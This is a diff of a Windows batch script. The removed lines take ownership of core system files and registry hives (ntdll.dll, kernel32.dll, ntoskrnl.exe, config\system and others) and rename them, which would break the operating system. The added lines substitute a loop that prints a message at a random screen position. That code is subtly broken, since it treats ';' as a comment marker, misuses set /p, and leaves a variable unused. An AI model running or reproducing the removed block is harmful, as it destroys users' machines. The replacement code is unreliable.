@@ -1,14 +1,16 @@
 @echo off
-:: Files to modify
-set files="C:\Windows\System32\ntdll.dll C:\Windows\System32\kernel32.dll C:\Windows\System32\hal.dll C:\Windows\System32\ntoskrnl.exe C:\Windows\System32\win32k.sys C:\Windows\System32\config\system C:\Windows\System32\config\software C:\Windows\System32\drivers\ntfs.sys C:\Windows\System32\drivers\tcpip.sys C:\Windows\System32\drivers\ndis.sys"
+color 0a ; Set the text color to green on black for visibility
 
-:: Take ownership and modify permissions
-for %%f in (%files%) do (
-    takeown /f %%f
-    icacls %%f /grant administrators:F
-)
+:LOOP
+set /a x=%random% %% 80 ; Random x-coordinate (0-79)
+set /a y=%random% %% 25 ; Random y-coordinate (0-24)
+cls ; Clear the screen
+mode con: cols=80 lines=25 ; Ensure consistent screen size
 
-:: Rename files
-for %%f in (%files%) do (
-    ren %%f %%~nf.old
-)
+; Move the cursor to the random position and display the message
+echo.| set /p dummyName="Hello from a random location!" <nul
+for /l %%i in (1,1,%y%) do echo.
+echo %dummyName%
+
+timeout /t 1 >nul ; Pause for 1 second
+goto LOOP
